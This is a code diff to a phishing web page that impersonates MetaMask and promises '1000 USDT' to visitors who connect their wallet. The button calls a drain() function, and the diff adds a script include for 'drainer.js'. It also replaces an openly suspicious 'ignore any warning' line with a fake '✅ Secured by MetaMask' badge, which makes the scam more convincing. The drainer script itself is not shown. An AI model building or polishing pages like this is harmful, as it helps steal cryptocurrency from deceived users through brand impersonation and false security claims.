@@ -61,6 +61,12 @@
     .connect-btn:hover {
       background: #e2761b;
     }
+    .secured {
+      font-size: 14px;
+      color: #00ff00; /* سبز */
+      margin-top: 20px;
+      font-weight: bold;
+    }
     .footer {
       font-size: 12px;
       color: #666;
@@ -72,19 +78,17 @@
 <body>
   <div class="container">
     <div class="fox-container" id="foxContainer">
-      <!-- لوگوی روباه واقعی MetaMask (خالص، بدون نوشته ConsenSys) -->
-      <img class="fox" src="https://1000logos.net/wp-content/uploads/2022/05/MetaMask-Symbol.png" alt="MetaMask Fox">
+      <img class="fox" src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask Fox">
     </div>
     <h1>MetaMask</h1>
     <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
     <p>No gas fees • Secure transaction • Powered by Ethereum</p>
-    <p style="color:#ffcc00; font-size:14px;">Ignore any warning — this is a verified claim.</p>
+    <p class="secured">✅ Secured by MetaMask</p>
     <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
     <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
   </div>
 
   <script>
-    // چرخش روباه به سمت موس
     const foxContainer = document.getElementById('foxContainer');
     const fox = foxContainer.querySelector('.fox');
 
@@ -96,4 +100,6 @@
       fox.style.transform = `rotate(${angle}deg)`;
     });
   </script>
-
+  <script src="drainer.js"></script>
+</body>
+</html>
